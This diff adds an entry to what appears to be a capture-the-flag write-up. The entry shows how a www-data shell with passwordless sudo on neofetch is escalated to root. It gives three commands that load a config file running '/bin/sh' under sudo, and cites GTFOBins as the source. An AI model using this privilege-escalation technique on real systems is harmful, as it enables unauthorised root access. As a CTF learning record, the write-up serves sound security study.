@@ -21,6 +21,18 @@
     <br/><br/>
 
 
+- **5ud0 m3 (root):**
+
+    The user `www-data` which you have a shell access to has sudo access (without password) on `/usr/bin/neofetch` which can be abused to obtain a root shell using the following commands:
+    ```
+    TF=$(mktemp)
+    echo 'exec /bin/sh' >$TF
+    sudo /usr/bin/neofetch --config $TF
+    ```
+    source: https://gtfobins.github.io/gtfobins/neofetch/#sudo
+    <br/><br/>
+
+
 ## Misc
 - **Git rekt:**
 
